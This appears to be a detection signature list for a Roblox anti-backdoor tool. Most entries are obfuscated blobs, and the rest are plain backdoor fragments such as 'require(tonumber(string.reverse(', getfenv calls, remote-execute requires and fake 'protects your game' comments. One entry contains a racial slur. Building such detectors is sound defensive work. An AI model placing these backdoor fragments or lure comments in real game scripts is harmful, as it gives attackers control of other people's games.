A2872HH2BD2IE2872I92I31F2IH2J52CN2BZ2FS2I82C22HT1F2112I82CD2BL2BS27P2CZ2HS2BA2752BH2BH2G72BL2JS2IM2JV2I62DC2IH2BH2B82CX1F2IO1F2K32K52IL2BB29L2BO2BS2JQ2I92792DI2IT2J82JE2BI1T2FT2BU2IS2H61F1I2B92CX2C22KJ1F2KI2H6]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[22M23A27523A2362761H1N1R1J23A23G27621D1J122111J14101V1L27D23H27621N1023X22026223W21D21R22J1T21623A22S27S1N141T27I161Q1N27P27K27M27O27D23C27G27I212141P1I131L1221R1O1G1P23A23527621228C27P21R1I23927627621Y21I29529623A22629929B23A21I29E29B23Q22129A29B29I29623I29O27622U29I26U25B23F26Z24U21J23823B29A24624B21Z24I24121J29A21I24E22N21D2402A927526U22J2251R23R2AG27523F24F23225C2AN1M22X21X1L2A829M26H21B23824D2AN22E21826P26N2492AN26U21F24822724N2AN23A23T21Y23R25721J23A22G2762251426G1A1R26523F1M22U23E23121J26G26F26123726X25Z1X25Q1C23V24V1Q27125X22S26T21M23721K23925S24W26M25423S25121V22R1R24P25K26125P25U2BN27624D21V23H23322724Y21M1R1F1A25723Z24525G24T22I24622323722T1C21M26E24224V2521224J22P26O25526Y25A23Y22224A26L1323C24B25A24324U25L21Y22228X28Z28C1F27L1523A27R2752901N2EF1421J1I1I1J1I2EC27521H1P1O1O1J28R29F2342761512141V1O1H23A29M15131K2772761L1U28729M29B2FL23A2461P21I23A23F27623723826X21K23T26H21V22121E23I22722K21V2FN23A22K2FR21Y27621123424C23E22W26F22C21L17101P21U2482442561124024N22D2591Y26R25Y22O25U2441K24C1L1W22L1R25026F23V2622682622181821026824S26C27026S21Q2132G821Q2GB27626T21J191V21O23S1L21G23223425R26Y26D25325Q21427321N171M1Y21U24F26G23K26V23625M22624J26424426226121B26W23P2301N26O23L26225M26S23923025M23323A23D27627827623E2F427I27C121N2JF1K1Q27D28Y2752152152F82ER1E2EU23A1H27I1G1J1O102JS152JV2JX1023B29622P27622S23623B2K52K529B23829F27529M2K52852FG2G82782K52KF22U2KH23A2KF2J92752K52952KF2KK2KT2762F32KS23A28J2KD2771R2762L528425Y2L32KU2KL29F2782KN29626Z2LD2]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[25G25N27525N25K27624924424425N25O27625524U25625A24I27G27825N23V23M21423A21123U25N25P27625B24Y25724U24K24T25N25Q27W24Q24P24N24U27M27625N26Q23V28A28B28E28B27521N26S27U27626S23S23N23Y23S23K28F27525V28H25N22322525V1F1Z27T25R27624M24Q25B24J25N29527524J25A24S24U28327625725524I24L25B28I24127622A26321N21G23U26327522E25V29U24C25V27522B26326J25N24C29X25N22A25F2A125F27522A26J2A12A725N22E2AD21G24C2AF25N2A52A72A927522826J2492A826J25L22322925V21L21G24225V2B12AC29U24B2AQ22B27623Z27622822R24Q25N24E22R25M2B222Z21M2B622Z2BO2AH2BB2AK2AM2BB2AQ22F25F25725N23S2BD2A625N24F2AA2AW24A2BL26J2BO2B32BR2B72BU2AN2BC2A425N2C323S2762BE2232C42BH22Z22J2BL22Z28Y22922B29U2422CR2BA21G2CL2AR25N2CY2CP29Y29T2D62CA26J29X23L2A72B22A02B62A322329S2BB2AA22E24329U2492432A426329X24D2AA22922R2CH2BN2DO23V2DU23V29Y24R2BB24R2752C11R2C42AQ22I2E721G2492E925N2292DD24529X22321U2572BB2C325N21Y24Z2DU24Z27521V2DY25N2E02752291J21G21G2432FA2502E22FB24222R21G2FF24B2CH24B2BU2EK2EM2EA2EC2EE25F2EG2C52752EJ2E82F82EQ2ES2EU2EW2752EZ2F12F32F52F72EO2FA2FC2FE2FG2B62FJ2FF21F2D221F28Y22A2FQ2EN22E2EB2D62ED25N2EF2EH2FY2GP2G129U2ER28Y2G42D62EX2G72EL2F225N2F42DZ2E12GD2FD2FK2GG2FI2HG22Z2D22CY2E62G02AL2GS24B2GU2GW2FX25N2FZ2EL2EN2EP2H12G32EV2H52G62F02H82G92HC2F82HE2GF2FJ2GH2HG23N2D223N2GN2GZ2HP2FT2GV2FV2GX2HV2IJ2HZ21G2H22ET2I224B2H62I52492H92HB2F62HD2FB2HF2FF2IC2HI2502BE2752462CQ2AA2AU2AR2AQ23W2AQ28I]], - Obfuscation Code Unecessary due to obfuscation detection

	[[1.12741221022]],

	-- [[\83\101\99\117\114\105\116\121\58\32\80\108\101\97\115\101\32\85\112\108\111\97\100\32\116\104\101\32\103\97\109\101\32\119\101\32\100\111\110\39\116\32\115\117\112\112\111\114\116\32\82\111\98\108\111\120\32\115\116\117\100\105\111]], - Obfuscation Code Unecessary due to obfuscation detection

	[[Security: Please Upload the game we don't support Roblox studio]],

	[[4324299218]],

	[[Builderman#7324]],

	[[ionicdev#9434]],

	[[--Do NOT delete this, it protects your game from exploiters like Typical Modders, Citizen, SonicElijahMania and much more.]],

	[[50903.78918*100000]],

	[[50903]],

	[[stoptrynacracknignog_]],

	-- [[21T21V27521S21W27521V21D21221E21I21627B21U27523721N1T25624X1221Y27922921S27927H27522927527H27427928027U280283284282283]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[\16\19\19\19\18\20\19\19\19\97\118\98\102\122\97\118\16\19\19\131\207\99\173\225\82\18\22\19\19\19\119\114\119\119\106\21\19\19\19\1\16\19\19\19\18\19\19\19\1\19\19\18\19\17\19\19\19\19\19\19\19\19\17\19\17\19\51\19\19\19\19\19\19\16\19\19\19\19\19\19\18\19\18\19\19\19\19\19\19\18\19\19\19\19\19\19\19\21\19\19\19\18\19\19\19\18\19\19\19\18\19\19\19\18\19\19\19\18\19\19\19\18\19\19\19\19]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[avbfzav��c��Rwrwwj3]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[\238\235\235\235\234\237\235\235\235\152\159\153\130\133\140\234\239\235\235\235\137\146\159\142\234\238\235\235\235\159\138\137\135\142\234\237\235\235\235\130\133\152\142\153\159\234\231\235\235\235\152\142\159\134\142\159\138\159\138\137\135\142\234\235\235\235\251\235\235\235\234\237\235\235\235\152\159\153\130\133\140\234\239\235\235\235\136\131\138\153\234\232\235\235\235\152\158\137\234\238\235\235\235\159\138\137\135\142\234\237\235\235\235\136\132\133\136\138\159\234\239\235\235\235\134\138\159\131\234\238\235\235\235\135\143\142\147\155\234\236\235\235\235\140\142\159\141\142\133\157\234\237\235\235\235\152\142\135\142\136\159\234\237\235\235\235\158\133\155\138\136\128\234\227\235\235\235\159\132\133\158\134\137\142\153\234\27\235\235\235\176\180\180\180\182\176\180\180\180\211\213\217\209\182\179\180\180\180\228\216\213\205\209\198\199\182\191\180\180\180\228\216\213\205\209\198\245\208\208\209\208\182\179\180\180\180\247\219\218\218\209\215\192\179\180\180\180\166\176\180\180\180\181\180\180\180\148\191\180\180\180\180\180\182\180\148\191\180\180\180\180\180\183\180\148\177\180\180\180\180\180\176\180\182\164\180\182\180\180\180\180\180\180\185\180\180\180\182\180\181\180\180\165\180\180\180\181\180\180\180\181\180\180\180\176\180\180\180\182\179\180\180\180\198\209\197\193\221\198\209\183\180\180\36\6\251\88\70\245\182\176\180\180\180\214\198\193\220\182\176\180\180\180\250\213\217\209\179\180\180\180\166\189\180\181\180\181\180]], - Obfuscation Code Unecessary due to obfuscation detection

	[[2542294198*2]],

	-- [[25T25V27525S25W27525V24H25224I24M25627B25U27524323J26D21R1X24225V25X27925V25Z27R27925D27527H27H27527W25V27427427U27H27427Z27R28427U25V28827R]], - Obfuscation Code Unecessary due to obfuscation detection

	[[ocal rHSja]],

	[[1707774015]],

	[[require(tonumber(string.reverse(]],

	[[19132145132]],

	[[pcall(function(ff)getfenv()]],

	[[Don't delete this, it will break the Anti-Backdoor!]],

	[[oors:")print(string.rep("-",10))for i=1,h do pcall(function()print(c[i])end)end;print(string.rep("-",10))print(string.rep("-",10))end)   ]],

	-- [[25N25R27525R25M27625B24U24M25925825R27427524O24U24I24Q25R25D27623S24Q25723V24Q25824S24Q24H24R24U24H25727E27827525B24S24U24J24J25Q27625J27625R25O27623Q25823Y25R25L27624C24S25924M25B25728K27625825728P24H24O27F27624P24M27X28T27527U28P28R29525R24C24G25625927V25R26Q27928628826F24P25624H24S25724M24G24H29M24P26E24O27Q24P27W25526F26E24426G25924Q25A25627C24Q26G24226F26Y27326U27327327227226Z2AM26E26924T24Q24Q24P2A327W24R26E25R23D23X27525H25I2B42B52B62B72B82B92BA2BB2BC2BD2BE2BF2BG2BH2BI2BJ2BK2BL2BM2BN2BO2BP2BQ2BR2BS2BT2BU2BV2BW2BX2BY2BZ2C02C12C22C32C42C52C62C72C82C92CA2CB2CC2CD2CE2CF2CG2CH2CI2CJ2CK2CL2CM2CN2CO2CP2CQ2CR2CS2CT2CU2CV2CW2CX2CY2CZ2D02D12D22D32D42D52D62D72D82D92DA2DB2DC2DD2DE2DF2DG2DH2DI2DJ2DK2DL2DM2DN2DO2DP2DQ2DR2DS2DT2DU2DV2DW2DX2DY2DZ2E02E12E22E32E42E52E62E72E82E92EA2EB2EC2ED2EE2EF2EG2DR28528724J29M29O29Q29S29U24P29W29Y2572A024H2A22A42A62A82AA2A72AD2AF2AH2AJ2AL2AN26Z2AP2AR2AT2AV27X26E2EH2FG2FH2FI2FJ2FK2FL2FM2FN2FO2FP2FQ2FR2FS2FT2FU2FV2FW2FX2FY2FZ2G02G12G22G32G42G52G62G72G82G92GA2GB2GC2GD2GE2GF2GG2GH2GI2GJ2GK2GL2GM2GN2GO2GP2GQ2GR2GS2GT2GU2GV2GW2GX2GY2GZ2H02H12H22H32DD28D25R26028D25G2H627526N2HB28A26527525P25R2HI2HB2HJ2HM28L27625K25R28A28A25N25Z2HP2HR27F2HV2752612HX2HG27628F2HC2642H62742I328A28325R2HD2HX28A28L2I32HI2HQ2HL2HI2HI2HO2752672HX2752HU2762IQ2HT2HZ25R2I128A25R25I2HL25R26]], - Obfuscation Code Unecessary due to obfuscation detection

	[[if Raindrop_a[1]],

	-- [[23P23N27523L23Q27523N26R26A26I26P26O23L23R27926C26A26M26E23L23X27925G26E26V25J26E26O26826E26L26F26A26L26V27F23U27926826K26P26K26U26V26I26L27M27427]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[24G24427524424227626C26W26926R27126Y24424927625Z26E26P26T26826P25C26Z26Z26W26U26T26E24424F27625X26Y26827125525]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[25N25G27525I25C27525G24J24L24P24H25I25Q27923N24H24W24724H25224Y24T24N27E27G27524624X24Q27L27N27P27E25O27923X25324724W24X24G24T24R25I25J27924624H25125I25F27925228F24X24T28K28C25G22S26824X25R21J23P28P27925G21G]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[24F24D27424B24F278191K151N27724F23J24Z23H22S23126624D24827824F1C1G1T1M26R26B26L27E27O2671G26723Z24F21J22U22T22U22P21K21G22T21J22T22S22P21H22R21F22Q24C27O24F23R24F27X27826725N26728P24F21R26W28T28L28V26T28Y28L21R27229227O25B26Z29627825B26U29A28V27329E25B28X28U21R29D29K26X29E21R29928U25B29129K27129E1V25H29E24F25G29X25O29X2612A024Z29E22N29528U24F24S29E27326S2A02AH2AC25L2A024K29X29U28Z1V27029X2AL2AC24J2A024I29E26725E29X25M2A926V29X25Q2A929R28Z23J29O2AC25U29X25V2A026629X25P29P26Q2A02A628U1V26Y2A02572A024P2A926R2A92B324D24A27O26N27226U26L26K24D28K27825Y26K26627N27O27727527O24D27X1T1T1D1H2AC2B32BP2B12AC23324G2AC24F2A025B2A026N26728L24E25927O23X26P27824E24F2DA28Z2742DD27O23I24F2462972D928K2DA27523X2CF24F2C924F2DP2782C127X2DU24F24924F2C127827X2772422DB27825F2782472DR28L2E92DI24F2CE27826Q2EA2DE2CH26A27827527N2EB24B25T2E324F2EB2DA23X26S2EU2E2278132DV28Z2EY2782E02F124B2512EU25B2E724F25O2EK27827N23X26H2782DJ2E02782822782452DZ2EF28L2FS2EB2FS28L2442FE24F2FD27824324F2FS2F12G42G624F2G52FQ24F2E627N2DJ2GD2E62E02E628L2E62EB2E62G32GE2GR2EB28L2G52G52GL27O2G52752G52D324F2G02G52ES2EU23Y2FE24O2D92DE27O24H2H22D92DJ2EO28L2CJ27O27026V27227W28Z22N28S28U2B02A02CU2AC23V2A02CX2AC2CZ2AC2D12D32D527O25U2782DH2HH2DT2D92DA2DC28Z2CH2DK2782DM2DE2DY2772DS2DY2DW2D627O2F82DQ2EU2E62DC2EE2EB2DS24F2EE2DJ2EH24F2EJ2EV2EL2782EN2DE2EQ28O2ET28O2J72EX2EZ2JF2G82F32E12F52JI2IT2E32FB2JF2FD2DC2FG2J72FI2DT2FL2EF2FO24F2GD2FS2GG28Z2FW2GA2FZ2G12GQ2G52G728Z2KC2GB2K227O2GN2EF2GI2EG2GR2GM2J72GP2KI2GR2IB2]], - Obfuscation Code Unecessary due to obfuscation detection

	[[_G.SS = ]],

	--  [[\000\0001\000\000\000\000\000\000\0001\0001\000\000\000\000\000\000\000\000\000\000\00011\000\000\000\000\000\000\000\000\000\000\00011\0001\000\0001\0001\000\000\0001\000\00011\000\000\0001\0001\000\000\0001\000\000\000\000\000\001\00011\000\000\000\000\00011\000\000\000\000\000\000\000\000\000\000\0001\00011\0001\000\0001\0001\000\0001\000\000\000\000\0001\0001\000\000111\000\000\000\0001\000\0001\000\000\000\00011\0001\000\000\000\000\000\000\0011\000\00011\000\000\000\000\00011\000\000\000\000\0001\000\000\000\000\0001\000\000\000\000\0001\00011\000\0001\000\0001\0001\000\000\000\0001\000\000\000\000\000\000\0001\000\000\000\000\000\0001\000\000\000\000\000111\001\0001\0001\0001\000\000\00011\000\000\000\000\000]], - Obfuscation Code Unecessary due to obfuscation detection

	[[00000_0101]],

	[[require(Execute)(RemoteFunctionArguments)]],

	[[Crypted SS]],

	[[Close SS]],

	[[:IsFriendsWith(370656357)]],

	[[script.Parent.OnClientInvoke=function(plr) Player:Kick('Do not hack on'..game.Name) end]],

	[[2536436743*2]],

	[[for i = 1, 2000000, 1 do]],

	[[local maxSpreadDist = 7]],

	-- [[BE6E0059008C0A02006B5H00E4944088212B48B44H0061B768A36B014H007B009B0A0200D9093H00BEF7D0CDCADFD0DDDBD9043H00BED0DBC9D90C3H00BEECDBD3D1CADBFBC8DBD0CAD9053H00BED9DFD3DBD90E3H00BEF4D1D7D0CACDEDDBCCC8D7DDDBD90B3H00BED2D1DFDACDCACCD7D02HD9083H00BECCDBCFCBD7CCDBD9073H00BECDDDCCD7CECAD90B3H00BEF2D1DFDACDCACCD7D02HD9053H00BEF0DFD3DBD9143H00BEECD1DCD2D1C6EED2DFC7DBCCF0D1CAFCDBCADFD9083H00BEEED2DFC7DBCCCDD90C3H00BEEED2DFC7DBCCFF2HDADBDAD9083H00BEFDD12HD0DBDDCA6B5H00E49440D9013H00BEE3ADCB18E3389H002H00043H000D9H002H00043H000D9H006H00019H002H00017H00029H009H001H00023H00029H006H00013H00019H002H00019H006H00029H002H00029H006H00033H00049H006H00049H002H00049H009H001H00017H00ECDE187964013H00019900930A0200D9053H00BED9DFD3DBD90B3H00BEF9DBCAEDDBCCC8D7DDDBD90E3H00BEF4D1D7D0CACDEDDBCCC8D7DDDBD9143H00BEECD1DCD2D1C6EED2DFC7DBCCF0D1CAFCDBCADFD90E3H00BEF1D0EDDBCCC8DBCCFBC8DBD0CAD9083H00BEFDD12HD0DBDDCA6B5H00E49440D9013H00BE04C3FC6E231B7H00079H002H00073H00079H002H00079H006H00073H000C3H000C9H002H00073H000D9H006H00079H002H00077H002426489C74013H00022601900A0200D90F3H00BEF9DBCAECDFD0D5F7D0F9CCD1CBCE6B3H00802EF147416B6H000840D90B3H00BED2D1DFDACDCACCD7D02HD9013H00BE709E6D2F68209H002H00099H009H009H00089H002H00083H00089H002H00083H00099H002H00099H006H00083H00089H006H00093H00093H000C3H00CC3BDE2F484H00058D0A02006A6E6C2EA66F66566C6A665E766E6C2E6154BA5392916F2E6F6E6C2E3H6E766F2H6E66CF38E3702H6E6C2E6F6E2H666C6E646E6F6E2H7E666E6C2E686E6C2E636E6C2E6D6E2H662H6E6C2E6F6E2H666206B75085916F2E]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[23I23D27523F1227523D1H1D1D191A21V22E22E1T1G1A1Q1M1B1T1O191922F27M1K22E27Q1G22E1E1S1R1H1M1M1I1A22E22622021S22021T22422322221S22322422422128F22721T22722E21T2121V21F21F1I21K21R21B2181N1D21721521H1H1V2191321T2152171F21M21921R2841S1Z1C21N22521I2121J2272251N2232121A2951X1821J29021522621Q21M21421O29121N2A521E1N21F2191Z21B1S22323F23H2791U1O1K1S23F23727921Q1S1D2161S1B1F1G1Q2AO23627921D27C192AV2AX2AZ2AO2742752151L1O102AW1A23F2B22BC2BE2BG1B21K1T1T1S1T23F2BB23D21M1M1N1N1S1Q1D23C27922O2792AI2AK2AM2BA2792BD2BF2BH2AP2AR2AT2CD2BN2BI23J2791S1K1R2BS2BI23G2791D1G1D1L2AO2AJ27521J2CA23F23E2791C1B1L23F22S27927B27D27F27H1E2DH22F1B1M1R1L1M1127T1M27V2AL2AN2872BU2CC2BE2B021C2BT2BK23D2BR27L1B1G192CV2BY2D42791P2ED23F2CT27521F2DL2E02EF27927M2DN1B2C427524922U22H1Q21K23F2CM2751O1C1D2831B2C82751N2D32AQ27521Q2CA22H1V1M1C1N2BT2352792AZ2BY2122D72D922U2DC2B52DF22E1G22F1G1K1U2D72DQ27V2261827C1V1N1K22F1U1G1V2EX2792FE1M1D2AW2F523D2GH111D23F2342DX2CE1B27F22H23F2FQ2752DD27E27G2FU2FW2FY2G027U22E1B21J21S2211N21S21622F1J191U2CG2EH21621I21J2A627M2BR2GO2CC1M1A1D21K1A101N1Q27923D22C27922Z2D52752EQ23D22H2I02762I82IA23D2I52I023F23D2IH2792I72I72II23D2IM2752IF2CM22Z2752AJ2I72I923D2AJ2AJ2CM22X2IQ23D2CT2AJ2IT2IY23D2FJ2752J72CT2IW2752CT2CT2GP2792IZ2J423D2J22IE23D2742J62IU23D2E22JC2IO2792IX2JG23D23923D2J72CM2E22JJ2J82J12J32AQ2AJ2212J323823D23B2I02D02IN2KC2J82J222W23D2KK2JR22Y2JM2J323A2J82K62IB2JV2332ID2EY2ID2JZ2K82J82302JL2KP2K223D2322KS2JO2312KV2IB2D52C42JN2C42AJ2IJ22I2IN2I02IX2IH2IH22P2KH2JW2IA]], - Obfuscation Code Unecessary due to obfuscation detection

	[[ToddIsCuteBuyRaindrop_]],

	-- [[22622727522422227522721R21821A1Z1Z22727427522L2792241T27927B27D1Z22V21521M1X21821N2121W1X27R21522U21421621N2152161X21L22V22U1K22W1J23I23I23F28E23J23I28E23I23G28L23C28I23E28L28H23I28J22W1I22V23E23J23A23J28J28G28G22U22P21921621621528A28721722U22422327921421A1Y21622421X279182841S21621P21L21221829M21Z29P2161W29L21N21P21I29N2791T27T29S29U29W29M21T279192121X2172AH21P21O21N1C2132121Z21722421S2A02A22842A52AB29V29X2252242212791S1W21M21P29X2B42791621O1A21721221N2BC2751V21A21P2872BJ22K2B629T21L29T1S21821P21221R21N2B02AD22421Y2792181W21P2B827W1X29M2B52752BO21O21M29L2BK2272BX21621A21N29M21W2791E21721729Q2AX2A42A621V2792AP2AR2171T2161Y1W2BU2AT2202D127Y2CC27V22722427K27K29H27521K21A2BI22725X25Y2DR2DR26U2342242DB2751B2162AN2C921I2792752DX22722L27H27G27927J2EA2252E42E42EE2E92EF2752332EJ2DH2EF2EH2EJ2E92EN2DG2C52752C72C921M2CB2CD2792CG2CI2F02EV2BO2CO2162EA2752CR2762DK2272DM2DO2DQ2DS25Y26E2DV2AF2752AH2AJ2AL2AN2D22AS2AU2AW2A32AZ2BT2AD2B329Z275161X2AN21A27U29M2ES2CC21K2CK2BW2BY2C02CK2BM2BO1X2BJ2FD1129K29M27827527O27E2F92272FD2GC2B82BA29M2EU2CL2C82CA2AI2F42272F22CJ2CE2CL2F62CP2GT2EE2762GP27A27C27E29G2792FF21N2GT2ER2H92B72B929X2EF2FD22723E2EJ2752HX2742E922N22V2792I127522O2I52792D02792HX2EJ22122J2792CR2E92232FM2272II2E723I2I927522122E2HO2272HE22S2HY2272IX2752EI22U2792EP22L2IP2752HE27522W2I92742IK2EF27H2I82J127921U2E422H2IY2JI2I22E42I62EC2J82792EL2EF2DH2EC2742J92JV2I629H2IS2IV2I92IW2IY2J02GT22723F2ED2E42AV2JQ2I72IQ22722F2EB22B2KI2JY2K52HY2EP2JN2JV2E42JX2JT2HV2EG2K522X]], - Obfuscation Code Unecessary due to obfuscation detection

	[[Yeah.. Our source is obfusicated. Why? The same reason you're looking at this. Our concern is, what's stopping people who develop
	backdoors from looking at the full raw code and then getting ideas on how to bypass this detection? The easiest way to bypass something
	is by having the source code to something your trying to bypass.]],

	-- [[\117\27\88\101\110\17\0\0\0\56\56\65\50\76\85\71\88\71\57\85\54\55\70\80\81\0\73\228\146\29\173\201\56\126\115\114\73\71\11\160\84\25\1\46\112\72\57\197\38\167\164\58\223\51\169\133\133\142\169\220\121\104\131\241\80\160\86\16\103\106\184\6\203\168\188\97\25\145\238\234\95\170\106\81\98\142\183\23\122\65\112\76\160\103\177\108\24\201\188\175\229\221\103\76\243\14\0\0\0\190\130\155\137\135\128\163\143\128\143\137\139\156\0\246\249\96\29\243\13\0\0\0\173\156\139\143\154\139\190\130\155\137\135\128\0\1\106\94\24\243\14\0\0\0\173\156\139\143\154\139\186\129\129\130\140\143\156\0\13\243\166\127\243\13\0\0\0\189\131\155\138\137\139\206\186\129\129\130\157\0\232\162\46\119\243\13\0\0\0\173\156\139\143\154\139\172\155\154\154\129\128\0\220\37\101\119\243\28\0\0\0\173\130\135\141\133\206\154\129\206\157\141\143\128\206\136\129\156\206\172\143\141\133\138\129\129\156\157\0\217\55\154\64\243\17\0\0\0\172\143\141\133\138\129\129\156\206\189\141\143\128\128\139\156\0\208\44\124\2\243\43\0\0\0\134\154\154\158\212\193\193\153\153\153\192\156\129\140\130\129\150\192\141\129\131\193\143\157\157\139\154\193\209\135\138\211\220\216\219\215\222\218\223\221\220\217\0\179\199\149\61\243\20\0\0\0\188\139\131\129\152\139\206\161\128\206\170\139\154\139\141\154\135\129\128\0\94\48\97\87\243\20\0\0\0\189\141\143\128\206\189\139\130\139\141\154\139\138\206\163\129\138\139\130\0\1\53\163\41\243\5\0\0\0\137\143\131\139\0\56\145\184\85\243\11\0\0\0\169\139\154\189\139\156]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[26626127526026527526125A25425025826025V27924E25824T23U25824R24V24W25627E27G27523V24S25327L27N27P27E25T27924024Q23U24T24S25924W25226027427524R25824O24S24W28E27921522O1H1W21424828B27924F24R25225A24Q25224Q27926125Z27925N27827627926X29027526326125N29A26126229927929B29B29829929529029J26126729025W26126027926525Y27929T29V25N25U27926429329B29V29R27925X29I26129K29H28C28129E29V26129T296279]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[21I21M27521L21523Y27521F27B27C27D27E27F27G27H27I27J27K27L27M27N27O27P27Q27R27S27T27U27V27W27X27Y27Z28028128228328428528628728828928A28B28C28D28E28F28G28H28I28J28K28L28M28N28O28P28Q28R28S28T28U28V28W28X28Y28Z29029129229329429529629729829929A29B29C29D29E29F29G29H29I29J29K29L29M29N29O29P29Q29R29S29T29U29V29W29X29Y29Z2A02A12A22A32A42A52A62A72A82A92AA2AB2AC2AD2AE2AF2AG2AH2AI2AJ2AK2AL2AM2AN2AO2AP2AQ2AR2AS2AT2AU2AV2AW2AX2AY2AZ2B02B12B22B32B42B52B62B72B82B92BA2BB2BC2BD2BE2BF2BG2BH2BI2BJ2BK2BL2BM2BN2BO2BP2BQ2BR2BS2BT2BU2BV2BW2BX2BY2BZ2C02C12C22C32C42C52C62C72C82C92CA2CB2CC2CD2CE2CF2CG2CH2CI2CJ2CK2CL2CM2CN2CO2CP2CQ2CR2CS2CT2CU2AC22E22D22H22J22E1Q2261722122622022B22C22L1K22G21V22622N112CX2CZ2D122B2D42D62D82DA22H22A22J2202DG2CY2D01Q22H2DL2D72D91K22122722G2DT2DI1Q22A1722622J22G22E22N1K22H22D22C2CZ2262E52DV22E2E92EB2ED1K2D822122N2202EK2DH2DV22G1722F22J22622A1K22E22M22N21U2222EL2D12251722L22N22622K22N22C2241Q22D2201Q22K2272EI22622B2EH1I1J2202FG22722022C1Q22T23J2382301Q2FJ22M2FB1Q2EN2ET22622F2FG2F22EP2DF2EX2D12272D422N2ED22H2EW2DU2D12EN2FR22222J22H2292FM2FO2EA2EC2EE2GW2GY2292GB22K2E92EH22722F22G2EU2H92FR2GR2FU2G22211I22M1J2GL2G81M22C1M22J171O1O1M2HX1M21T21Z2HQ2D3181F1C2GB22D172I222K2FN2GC171A1M2261N1B1Q22M22D2FM22P22E22V1722B1I22E1J2G92GB2EN1B2HH2FS2HK1Q2202FW2HQ22N1722K1I22H2HN1M22E2JF1J1M191C2HP1722E1H2J12HQ22C2JA2JC2JE2JG2JO22N2IK2JI2JK2JM2JX112FY2262G02G22G22IY2J92IU2J61J1J22J22P1B2IS2DF22522A22B2ED2GC161P22M2IM2IO2HQ2EN2KD22B22K2IP2IR2F32FJ1Q2JS22D2IQ22V]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[24L24J27524J24K27625T25I25U25Y25M27A24I27522B25023924W22A26A24J24M27626O25Z25E25T25Z27O27625V25T25M25P27V25027626E25W23O25S23N26A28125M26825N25I25E25Z25X24223N25R25O25E25J25I25J24J24S27626J25O25V25I23N26225O25Y23N26E25P25L25O26223M27627524V27624X24H27627G27524X27527G29E29927629E29E23N29M24J24G29R29E27G29I27624N29C29J27W29R24J29V24J29X27529Z29H2A127429F29N24J29G2992AG]], - Obfuscation Code Unecessary due to obfuscation detection

	[[script.Parent.Name..math.random(1,999999)/26*3+math.random(5,100)/0.5]],

	-- [[\197\192\192\192\193\192\192\128\69\157\192\50\129\195\196\192\192\192\167\161\173\165\195\199\192\192\192\144\172\161\185\165\178\179\195\203\192\192\192\144\172\161\185\165\178\129\164\164\165\164\195\199\192\192\192\131\175\174\174\165\163\180\207\192\192\192\210\207\192\192\192\193\192\192\192\210\192\192\193\192\194\192\192\192\224\192\192\193\192\193\192\195\192\224\192\192\193\192\193\192\196\192\224\192\192\193\192\193\192\197\192\194\218\192\195\192\192\192\192\192\192\195\192\193\192\195\192\193\192\210\192\192\193\192\194\192\192\192\224\192\192\193\192\193\192\195\192\224\192\192\193\192\193\192\196\192\224\192\192\193\192\193\192\197\192\198\213\192\195\192\193\192\193\192\193\192\192\222\192\192\192\192\192\192\192\192\205\192\193\192\195\192\193\192\192\206\192\192\192\193\192\192\192\192\194\192\192\192\199\192\192\192\195\196\192\192\192\142\161\173\165\195\195\192\192\192\161\161\161\195\197\192\192\192\176\178\169\174\180\195\217\192\192\192\183\165\172\172\224\174\169\163\165\224\180\175\224\173\165\165\180\224\185\175\181\225\224\250\132\195\199\192\192\192\178\165\177\181\169\178\165\193\192\192\96\216\135\215\50\129\195\196\192\192\192\148\133\147\148\206\192\192\192\224\215\192\193\192\192\192\193\192\230\192\192\193\192\199\192\193\192\194\192\196\208\192\192\192\199\192\193\192\210\196\192\193\192\195\192\192\192\210\211\192\194\192\196\192\192\192\192\193\192\193\192\194\192\193\192\196\208\192\192\192\205\192\193\192]], - Obfuscation Code Unecessary due to obfuscation detection

	[[SpecialMesh animator by Jerome#1018]],

	[[Part animator by Jerome#1018]],

	[[animator by Jerome#1018]],

	[[OMG YOU IS HAXORED NO WAI]],

	[[SERENITY_]],

	[[omfg a damn game!]],

	[[1460281907]],

	-- [[23A21S27521U21X27521S21F21C1X21J21A21U21W2792131X21921121U22B2791J21121E21I27R1J1Z21E21521C21G27Q27S2151Z2]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[2361Z2751W2132751Z22621U22F2231W21227921X2272242242291W1W27921U21T22827N27927B22J1W21127922822F22922222521W27727921S22321U27M27827521T22I22F21Y27X27H27L27B22F27T27522921Y22B28N1Z22822E21T1Y27525F26429025O22Q28X27524S23B25Q25L29327526B25L25X21N25Q29A1Z24J2261R21F26929H26B27224A1K25N29H25F25Y24I23W25P29H24J24P25U25E26Q29H21V26921721125I29H1323N26P23V2922941Z1L1521V26X29U25Y25922325E2AC22D25K2642AH29B25W255182AS29424J22Z21325J2AN29421V1H2192402AX1Z26B22A1B26K25J29H22R2171X22626P2BL23Z26F26829Z2AI22321H21729T2B31B1E1C2682BL25Y26Z1L29G29423N21425D26E2992AI25723L1324H2AC26R1V21J25K29H1Z22I22K26125R2CR25S25H25V26B29O26125F21X2C028Y24323M2552BV27522R1O24M2392A52CB1322M1V2AB2AI22K25Z25A2BE22R24526B26W26Y2BL24Y22Y23Q2B22DC1B22S2AW2CM1T25P25F2A022Z23F21W26W2A01Y23O24F2BE2B42722502BK29422R25L24025W2BQ2AI22722226S2DB27524T25W26S25G2CR21S24C23226F2BL2641729729H23N21F25H25A2CG27921J22F1324X2AC2102551P2CQ2CB1V22826W2CW2AI26322N23L24C2FD26N24P2522D629I22Z1724M2EY26B25I24C26H26R29U22F24N2292DM2751321022F24X2BE26B22B26T2392DW2EO24X25625E2E11Z23N24S2652662BE1324924O2432E929426B24W21O25L2EE2AI27325B26E2EJ21T1B21V2EN2DC22321324H26O2BL26R22425L2EY23N22T23H23O2F32B323I25M22026E2AC22926X22B2CA2DC26B22Z26Q2GX2GN22A2462622IH2BF25823C21G25C2CR22D23B1H24322Q1W21027928922822322321Y27W28C1Z2J622324F2791Z24R2JH27921D27528X2AI132JN1Z28X1X1Z2JM1Z2JU2JP2752JU2JU27O2JW27O2JZ1Z27O